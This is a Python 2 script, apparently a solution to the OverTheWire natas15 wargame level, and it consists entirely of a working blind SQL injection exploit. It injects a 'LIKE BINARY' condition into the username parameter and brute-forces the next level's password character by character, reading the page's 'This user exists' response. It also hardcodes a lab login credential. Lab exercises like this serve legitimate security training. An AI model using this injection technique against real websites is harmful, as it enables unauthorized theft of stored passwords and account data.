import requests
from requests.auth import HTTPBasicAuth

url = "http://natas15.natas.labs.overthewire.org/index.php?debug=True&username="
flag = 1
password = "W"
while flag == 1:
	for i in '0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM':
		finalURL = url + "natas16\" and password LIKE BINARY \"" + password + i + '%'
		#print finalURL
		req = requests.get(finalURL, auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
		if "This user exists" in req.text:
			password = password + i
			print password
			break
		else:
	 		print "."